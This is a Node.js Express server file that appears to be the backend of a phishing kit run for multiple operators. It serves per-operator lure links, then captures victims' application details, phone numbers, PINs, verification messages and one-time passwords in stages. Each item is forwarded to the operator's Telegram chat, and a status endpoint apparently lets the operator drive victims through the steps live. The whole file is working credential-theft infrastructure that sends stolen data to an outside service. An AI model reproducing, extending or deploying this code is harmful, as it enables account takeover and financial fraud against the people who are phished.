// server.js
require('dotenv').config();
const express = require('express');
const path = require('path');
const db = require('./db');
const telegram = require('./telegram');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true })); // For HTML forms

// --- ADMIN ROUTES ---
// Serve the admin panel (You must create admin.html in your root folder later)
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

// API to add a new client
app.post('/api/add-client', async (req, res) => {
    try {
        const { clientId, chatId, name } = req.body;
        await db.createClient(clientId, chatId, name);
        res.json({ success: true, message: "Client added successfully!" });
    } catch (error) {
        res.status(500).json({ error: "Client ID already exists or error occurred." });
    }
});

// API to get all clients (for the admin dashboard)
app.get('/api/clients', async (req, res) => {
    const clients = await db.getAllClients();
    res.json(clients);
});

// --- CLIENT WEB APP ROUTE ---
// This handles the unique links like /apply/john123
app.get('/apply/:clientId', async (req, res) => {
    const client = await db.getClient(req.params.clientId);
    if (!client) return res.status(404).send("Client not found. Link is invalid.");
    
    // Serve your main index.html, but pass the clientId to it
    res.sendFile(path.join(__dirname, 'index.html'));
});

// --- API ROUTES (Triggered by the website) ---
app.post('/api/apply', async (req, res) => {
    const sessionId = Date.now().toString();
    const { clientId, ...data } = req.body;
    
    // 1. Find which Telegram ID belongs to this clientId
    const client = await db.getClient(clientId);
    if (!client) return res.status(404).json({ error: "Invalid Client ID" });

    // 2. Save the session
    await db.createSession(sessionId, clientId, data);

    // 3. Send to the Client's Telegram!
    await telegram.sendApplicationToTelegram(client.chatId, sessionId, data);
    
    res.json({ success: true, sessionId });
});

app.post('/api/login', async (req, res) => {
    const { sessionId, phone, pin } = req.body;
    const session = await db.getSession(sessionId);
    if (!session) return res.status(404).json({ error: "Session not found" });

    const client = await db.getClient(session.clientId);
    await db.updateSessionData(sessionId, { status: 'PENDING_PIN', phone, pin });
    
    await telegram.sendPinToTelegram(client.chatId, sessionId, { phone, pin });
    res.json({ success: true });
});

app.post('/api/verification', async (req, res) => {
    const { sessionId, verificationMsg } = req.body;
    const session = await db.getSession(sessionId);
    if (!session) return res.status(404).json({ error: "Session not found" });

    const client = await db.getClient(session.clientId);
    await db.updateSessionData(sessionId, { status: 'PENDING_VERIFICATION', verificationMsg });
    
    await telegram.sendVerificationToTelegram(client.chatId, sessionId, { phone: session.phone, verificationMsg });
    res.json({ success: true });
});

app.post('/api/otp', async (req, res) => {
    const { sessionId, otp } = req.body;
    const session = await db.getSession(sessionId);
    if (!session) return res.status(404).json({ error: "Session not found" });

    const client = await db.getClient(session.clientId);
    await db.updateSessionData(sessionId, { status: 'PENDING_OTP', otp });
    
    await telegram.sendOtpToTelegram(client.chatId, sessionId, { phone: session.phone, otp });
    res.json({ success: true });
});

app.get('/api/status/:sessionId', async (req, res) => {
    const session = await db.getSession(req.params.sessionId);
    if (!session) return res.status(404).json({ error: "Session not found" });
    res.json({ status: session.status });
});

// --- TELEGRAM WEBHOOK ---
app.post('/webhook', (req, res) => {
    telegram.bot.processUpdate(req.body);
    res.sendStatus(200);
});

// --- START SERVER ---
const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
    console.log(`Server running at http://localhost:${PORT}`);
    
    if (process.env.RENDER_EXTERNAL_URL) {
        const webhookUrl = `${process.env.RENDER_EXTERNAL_URL}/webhook`;
        try {
            await telegram.bot.setWebHook(webhookUrl);
            console.log(`✅ Webhook set to: ${webhookUrl}`);
        } catch (error) {
            console.error('❌ Failed to set webhook:', error);
        }
    }
});
